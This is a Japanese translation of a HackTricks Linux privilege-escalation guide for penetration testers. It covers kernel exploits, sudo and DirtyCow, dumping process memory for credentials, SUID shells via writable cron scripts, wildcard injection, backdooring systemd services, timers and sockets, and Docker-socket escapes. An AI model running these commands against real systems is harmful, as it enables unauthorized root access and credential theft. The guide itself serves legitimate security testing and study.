# Linux権限昇格

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>**からAWSハッキングをゼロからヒーローまで学ぶ**</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
- **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>

## システム情報

### OS情報

実行中のOSに関する知識を得ることから始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし`PATH`変数の中のどこかのフォルダに**書き込み権限**があれば、いくつかのライブラリやバイナリを乗っ取ることができるかもしれません：
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーがありますか？
```bash
(env || set) 2>/dev/null
```
### カーネルの脆弱性

カーネルのバージョンを確認し、特権昇格に使用できる脆弱性があるかどうかをチェックします。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルのリストとすでに**コンパイルされたエクスプロイト**はこちらで見つけることができます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
他のサイトでいくつかの**コンパイルされたエクスプロイト**を見つけることができる場所: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブサイトからすべての脆弱なカーネルバージョンを抽出するには、以下のコマンドを実行します:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
以下は、特権昇格を検索するのに役立つツールです：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（被害者で実行し、カーネル2.xの脆弱性のみをチェック）

常に**Googleでカーネルバージョンを検索**してください。おそらくあなたのカーネルバージョンはあるカーネルの脆弱性に記載されており、その脆弱性が有効であることを確認できます。

### CVE-2016-5195（DirtyCow）

Linux特権昇格 - Linuxカーネル <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

脆弱な sudo バージョンに基づいています:
```bash
searchsploit sudo
```
以下のgrepを使用して、sudoのバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov から
```
sudo -u#-1 /bin/bash
```
### Dmesg署名検証に失敗しました

この脆弱性がどのように悪用されるかの**例**については、**HTBのsmasher2ボックス**を参照してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### より多くのシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### Grsecurity

Grsecurityは、Linuxカーネルのセキュリティ強化パッチであり、特権昇格攻撃に対する保護を提供します。
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaXは、Linuxカーネルにセキュリティ機能を追加するためのパッチです。これにより、メモリの保護、実行可能なメモリ領域の制限、およびその他のセキュリティ機能が強化されます。PaXは、特権昇格攻撃などの脆弱性を悪用する攻撃からシステムを保護するのに役立ちます。
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshieldは、Linuxカーネルのセキュリティ機能の1つであり、スタックやヒープのオーバーフローからシステムを保護するために使用されます。これにより、悪意のあるコードが実行されることを防ぎ、特権昇格攻撃などの脅威からシステムを守ります。
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

### SElinux

SElinux（Security-Enhanced Linux）は、Linuxカーネルに組み込まれたセキュリティ機能であり、アクセス制御や強化された権限管理を提供します。SElinuxは、プロセスやファイルに対するアクセス権を厳密に制御し、特権昇格攻撃を防ぐのに役立ちます。
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR（Address Space Layout Randomization）は、攻撃者が悪用するためのメモリの配置をランダム化するセキュリティ機能です。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Dockerコンテナ内にいる場合、そこから脱出を試みることができます:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## ドライブ

**マウントされているものとアンマウントされているもの**をチェックし、どこにどのようにマウントされているかを確認してください。何かがアンマウントされている場合は、それをマウントしてプライベート情報をチェックすることができます。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**インストールされているコンパイラ**を確認してください。これは、カーネルエクスプロイトを使用する必要がある場合に役立ちます。そのエクスプロイトをコンパイルすることが推奨されているため、それを使用するマシン（または類似のマシン）でコンパイルする必要があります。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール

**インストールされたパッケージやサービスのバージョン**を確認してください。たとえば古いNagiosバージョンなど、特権昇格に悪用される可能性があるかもしれません...\
より疑わしいインストールされたソフトウェアのバージョンを手動で確認することをお勧めします。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンへのSSHアクセス権がある場合は、**openVAS**を使用して、マシン内にインストールされている古いバージョンや脆弱なソフトウェアをチェックすることもできます。

{% hint style="info" %}
_これらのコマンドはほとんど役に立たない情報を表示する可能性があるため、既知の脆弱性に対してインストールされたソフトウェアのバージョンが脆弱かどうかをチェックするOpenVASなどのアプリケーションを使用することをお勧めします_
{% endhint %}

## プロセス

**実行されているプロセス**を確認し、**それ以上の権限を持つプロセス**がないかをチェックしてください（たとえば、rootユーザーによって実行されているtomcatなど）。
```bash
ps aux
ps -ef
top -n 1
```
常に実行中の **electron/cef/chromium デバッガー** をチェックしてください。特権昇格に悪用される可能性があります。**Linpeas** は、プロセスのコマンドライン内に `--inspect` パラメータがあるかどうかをチェックしてこれらを検出します。\
また、**プロセスのバイナリに対する特権を確認**してください。他のユーザーのものを上書きできるかもしれません。

### プロセスの監視

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用してプロセスを監視できます。これは、脆弱なプロセスが頻繁に実行されているか、一連の要件が満たされたときに特に役立ちます。

### プロセスメモリ

サーバーの一部のサービスは、**メモリ内に平文で資格情報を保存**します。\
通常、他のユーザーに属するプロセスのメモリを読むには **root 権限** が必要です。そのため、既に root 権限を持っている場合に追加の資格情報を発見したいときに特に役立ちます。\
ただし、**通常のユーザーとして、所有するプロセスのメモリを読むことができます**。

{% hint style="warning" %}
現在、ほとんどのマシンは **デフォルトで ptrace を許可していない** ことに注意してください。つまり、特権のないユーザーに属する他のプロセスをダンプすることはできません。

ファイル _**/proc/sys/kernel/yama/ptrace\_scope**_ は ptrace のアクセス可能性を制御します:

* **kernel.yama.ptrace\_scope = 0**: 同じ uid を持つプロセスであればすべてデバッグできます。これが ptrace の古典的な動作方法です。
* **kernel.yama.ptrace\_scope = 1**: 親プロセスのみがデバッグできます。
* **kernel.yama.ptrace\_scope = 2**: 管理者のみが ptrace を使用できます。CAP\_SYS\_PTRACE 機能が必要です。
* **kernel.yama.ptrace\_scope = 3**: ptrace でプロセスをトレースできません。一度設定すると、再起動して ptrace を再度有効にする必要があります。
{% endhint %}

#### GDB

FTP サービスのメモリにアクセスできる場合（例えば）、Heap を取得してその資格情報を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDについて、**mapsはそのプロセスの** 仮想アドレス空間内でのメモリのマッピング方法を示し、**各マップされた領域の権限**も示します。 **mem**疑似ファイルは、**プロセスのメモリ自体を公開**します。 **maps**ファイルからは、**どのメモリ領域が読み取り可能であるかとそのオフセット**がわかります。この情報を使用して、**memファイルに移動し、すべての読み取り可能な領域をファイルにダンプ**します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`はシステムの**物理**メモリにアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間は`/dev/kmem`を使用してアクセスできます。\
通常、`/dev/mem`は**root**と**kmem**グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDumpは、Windows向けSysinternalsツールスイートのクラシックなProcDumpツールのLinuxにおける再構想です。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスメモリをダンプするためには、次のツールを使用できます:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_rootの要件を手動で削除し、所有しているプロセスをダンプできます
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) からのスクリプト A.5 (rootが必要)

### プロセスメモリからの資格情報

#### 手動の例

認証プロセスが実行されていることがわかった場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
次の手順を参照してプロセスのメモリをダンプし、メモリ内の資格情報を検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)は、メモリから**平文の資格情報を盗み出し**、一部の**よく知られたファイル**からも取得します。正しく動作するには、root権限が必要です。

| 機能                                             | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDMパスワード（Kali Desktop、Debian Desktop）     | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                          | lightdm              |
| VSFTPd（アクティブFTP接続）                        | vsftpd               |
| Apache2（アクティブHTTP Basic認証セッション）      | apache2              |
| OpenSSH（アクティブSSHセッション - Sudo使用）       | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 予定された/Cron ジョブ

スケジュールされたジョブに脆弱性がないか確認します。おそらく、root が実行するスクリプトを悪用できるかもしれません（ワイルドカードの脆弱性？root が使用するファイルを変更できますか？シンボリックリンクを使用しますか？root が使用するディレクトリに特定のファイルを作成しますか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cronのパス

例えば、_**/etc/crontab**_ 内にPATHが見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー"user"が/home/userに対して書き込み権限を持っていることに注意_)

このcrontab内で、rootユーザーがパスを設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
その後、次のようにしてrootシェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### スクリプトをワイルドカードで使用するCron（ワイルドカードインジェクション）

ルートによって実行されるスクリプトにコマンド内に "**\***" がある場合、これを悪用して予期しないこと（例：権限昇格）を行うことができます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードがパスの前にある場合** _**/some/path/\***_ **のように、脆弱性はありません（** _**./\***_ **も同様です）。**

詳細なワイルドカードの悪用テクニックについては、次のページを参照してください：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cronスクリプトの上書きとシンボリックリンク

**rootユーザーによって実行されるcronスクリプトを変更できる**場合、簡単にシェルを取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
もしrootによって実行されたスクリプトが、あなたが完全なアクセス権を持つ**ディレクトリ**を使用している場合、そのフォルダを削除して**別のスクリプトが制御可能なフォルダへのシンボリックリンクフォルダを作成**することが役立つかもしれません
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁なcronジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを検索できます。これを利用して特権を昇格させることができるかもしれません。

たとえば、**1分間に0.1秒ごとに監視**し、**実行されたコマンドが最も少ない順にソート**して、最も実行されたコマンドを削除するには、次のようにします：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**pspy**を使用することもできます（これにより、開始されるすべてのプロセスが監視およびリスト化されます）。

### 不可視のcronジョブ

**コメントの後にキャリッジリターンを入れる**ことで（改行文字なしで）、cronジョブを作成することが可能です。例（キャリッジリターン文字に注意してください）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルを書き込むことができるかどうかを確認してください。もし書き込める場合、サービスが **開始**、**再起動**、**停止**されるときに、それを **実行**するように **変更**することができます（おそらくマシンが再起動されるまで待つ必要があるかもしれません）。\
例えば、バックドアを `.service` ファイル内に作成する：**`ExecStart=/tmp/script.sh`**

### 書き込み可能なサービスのバイナリ

サービスによって実行されるバイナリに **書き込み権限** がある場合、それらをバックドアに変更することができます。そのため、サービスが再実行されるときにバックドアが実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH を次で確認できます：
```bash
systemctl show-environment
```
もし、パスの中のどこかに**書き込み**権限があることがわかった場合、**特権昇格**ができるかもしれません。次のような**サービス構成ファイル**で使用されている**相対パス**を検索する必要があります：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、**実行可能**ファイルを作成し、**systemd PATHフォルダ内の相対パスバイナリと同じ名前**で作成します。サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）を実行するように求められた場合、あなたの**バックドアが実行されます**（通常、権限のないユーザーはサービスを開始/停止できませんが、`sudo -l`を使用できるかどうかを確認してください）。

**`man systemd.service`**でサービスについて詳しく学びます。

## **タイマー**

**タイマー**は、名前が`**.timer**`で終わるsystemdユニットファイルで、`**.service**`ファイルやイベントを制御します。**タイマー**は、カレンダー時間イベントやモノトニック時間イベントの組み込みサポートを持つため、cronの代替として使用できます。非同期で実行できます。

すべてのタイマーを列挙するには、次のコマンドを使用します：
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unit（.serviceや.targetなど）のいくつかを実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unitが何であるかを読むことができます：

> このタイマーが経過したときにアクティブ化するユニット。引数はユニット名であり、その接尾辞は「.timer」ではありません。指定されていない場合、この値は、タイマーユニットと同じ名前のサービスにデフォルトで設定されます（上記を参照）。アクティブ化されるユニット名とタイマーユニットのユニット名が、接尾辞を除いて同一であることが推奨されています。

したがって、この権限を悪用するには、次のことが必要です：

- **書き込み可能なバイナリを実行している**systemdユニット（たとえば`.service`）を見つける
- **相対パスを実行している**systemdユニットを見つけ、**systemd PATH**上で**書き込み権限**を持っている（その実行可能ファイルをなりすますため）

**`man systemd.timer`** でタイマーについて詳しく学ぶ。

### **タイマーの有効化**

タイマーを有効にするには、root権限が必要で、次のコマンドを実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
**タイマー**は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`にシンボリックリンクを作成することで**アクティブ化**されます。

## ソケット

Unixドメインソケット（UDS）は、クライアントサーバーモデル内で同じマシンまたは異なるマシン間で**プロセス間通信**を可能にします。これらは、標準のUnix記述子ファイルを使用してコンピュータ間通信を行い、`.socket`ファイルを介して設定されます。

ソケットは`.socket`ファイルを使用して構成できます。

**`man systemd.socket`**でソケットについて詳しく学びます。このファイル内では、いくつかの興味深いパラメータを構成できます:

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`: これらのオプションは異なりますが、要約された情報は、ソケットがどこでリッスンするかを示すために使用されます（AF_UNIXソケットファイルのパス、リッスンするIPv4/6および/またはポート番号など）。
* `Accept`: ブール値を取ります。**true**の場合、**着信接続ごとにサービスインスタンスが生成**され、接続ソケットのみが渡されます。**false**の場合、すべてのリッスンソケット自体が**開始されたサービスユニットに渡され**、すべての接続に対して1つのサービスユニットが生成されます。この値は、データグラムソケットおよびFIFOの場合には無条件にすべての着信トラフィックを処理する単一のサービスユニットが生成されるため、無視されます。**デフォルトはfalse**です。パフォーマンス上の理由から、新しいデーモンは`Accept=no`に適した方法でのみ記述することが推奨されます。
* `ExecStartPre`、`ExecStartPost`: 1つ以上のコマンドラインを取り、それらはリッスン**ソケット**/FIFOが**作成**およびバインドされる**前**または**後**に**実行**されます。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
* `ExecStopPre`、`ExecStopPost`: 追加の**コマンド**で、それらはリッスン**ソケット**/FIFOが**閉じられ**、削除される**前**または**後**に**実行**されます。
* `Service`: **着信トラフィック**で**アクティブ化するサービス**ユニット名を指定します。この設定は、Accept=noのソケットにのみ許可されています。デフォルトでは、ソケットと同じ名前のサービス（接尾辞が置換されたもの）がデフォルトです。ほとんどの場合、このオプションを使用する必要はないはずです。

### 書き込み可能な`.socket`ファイル

**書き込み可能**な`.socket`ファイルを見つけた場合、`[Socket]`セクションの冒頭に次のようなものを追加できます: `ExecStartPre=/home/kali/sys/backdoor`、そしてバックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンが再起動されるまで待つ必要があるでしょう。**\
_そのソケットファイル構成を使用している必要があることに注意してください。そうでない場合、バックドアは実行されません_

### 書き込み可能なソケット

（ここではUnixソケットについて話しており、構成`.socket`ファイルについてではない）**書き込み可能なソケット**を特定した場合、そのソケットと通信し、脆弱性を悪用する可能性があります。

### Unixソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**攻撃例:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTPソケット

HTTPリクエストを待ち受ける**ソケット**がいくつか存在する可能性があることに注意してください（_私は.socketファイルではなく、Unixソケットとして機能するファイルについて話しています_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### 書き込み可能なDockerソケット

Dockerソケットは、通常`/var/run/docker.sock`にあり、セキュリティを確保する必要がある重要なファイルです。デフォルトでは、`root`ユーザーと`docker`グループのメンバーが書き込み権限を持っています。このソケットへの書き込みアクセスを持つことは特権昇格につながる可能性があります。これがどのように行われるか、およびDocker CLIが利用できない場合の代替方法について説明します。

#### Docker CLIを使用した特権昇格

Dockerソケットへの書き込みアクセス権がある場合、次のコマンドを使用して特権を昇格させることができます。
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### **Docker APIを直接使用する**

Docker CLIが利用できない場合、Docker APIと`curl`コマンドを使用してDockerソケットを操作することができます。

1.  **Dockerイメージのリスト:** 利用可能なイメージのリストを取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **コンテナの作成:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **コンテナにアタッチ:** `socat`を使用してコンテナに接続し、それ内でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後、ホストのファイルシステムへのルートレベルアクセスを持つコンテナ内で直接コマンドを実行できます。

### その他

**`docker`グループに所属しているためにDockerソケットに書き込み権限がある場合**、[**特権を昇格させるためのさらなる方法**](interesting-groups-linux-pe/#docker-group)があります。[**Docker APIがポートでリスニングされている場合、それを妨害することもできます**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**Dockerから脱出したり特権を昇格させるために悪用する方法**については、以下を確認してください:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 特権昇格

**`ctr`**コマンドを使用できることがわかった場合、**特権を昇格させるために悪用できる可能性がある**ため、以下のページを読んでください:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 特権昇格

**`runc`**コマンドを使用できることがわかった場合、**特権を昇格させるために悪用できる可能性がある**ため、以下のページを読んでください:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Busは、アプリケーションが効率的に相互作用しデータを共有するための洗練された**プロセス間通信（IPC）システム**であり、現代のLinuxシステムを考慮して設計されています。基本的なIPCをサポートし、プロセス間のデータ交換を促進するUNIXドメインソケットの強化版をサポートしています。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetoothデーモンからの着信コールに関するシグナルは、音楽プレーヤーにミュートするよう促し、ユーザーエクスペリエンスを向上させます。さらに、D-Busはリモートオブジェクトシステムをサポートし、アプリケーション間のサービスリクエストやメソッド呼び出しを簡素化し、従来は複雑だったプロセスを合理化します。

D-Busは**許可/拒否モデル**で動作し、一致するポリシールールの累積効果に基づいてメッセージの権限（メソッド呼び出し、シグナルの発行など）を管理します。これらの権限の悪用を通じて特権昇格が可能になる可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf`にあるポリシーの例では、ルートユーザーが`fi.w1.wpa_supplicant1`にメッセージを所有し、送信し、受信する権限が記載されています。

特定のユーザーやグループが指定されていないポリシーは普遍的に適用され、"default"コンテキストポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus通信の列挙とコマンドインジェクションの特権昇格方法を学びます:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **ネットワーク**

常にネットワークを列挙し、マシンの位置を特定することが興味深いです。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### オープンポート

常に、アクセスする前に対話できなかったマシンで実行されているネットワークサービスを確認してください：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### スニッフィング

トラフィックをスニッフィングできるかどうかを確認してください。できる場合、いくつかの資格情報を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

**自分**が誰であり、どのような**特権**を持っているか、システムにはどのような**ユーザー**がいるか、どのユーザーが**ログイン**できるか、どのユーザーが**root 権限**を持っているかを確認します：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

